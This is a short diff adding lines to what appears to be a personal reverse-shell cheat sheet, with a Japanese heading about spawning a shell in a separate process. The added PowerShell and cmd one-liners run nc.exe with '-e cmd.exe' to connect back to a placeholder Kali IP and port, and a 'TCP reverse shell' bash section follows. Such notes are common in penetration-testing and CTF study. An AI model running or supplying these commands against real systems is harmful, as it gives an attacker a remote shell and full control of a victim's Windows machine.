@@ -1,3 +1,13 @@
+# 既存のものから別プロセスで張る方法
+powershell
+```
+Start-Process "C:\Path\To\nc.exe" -ArgumentList "YOUR.KALI.IP 4444 -e cmd.exe"
+```
+
+cmd
+```
+start C:\Path\To\nc.exe KALI.IP PORT -e cmd.exe
+```
 # TCP reverse shell
 ## bash
 ```
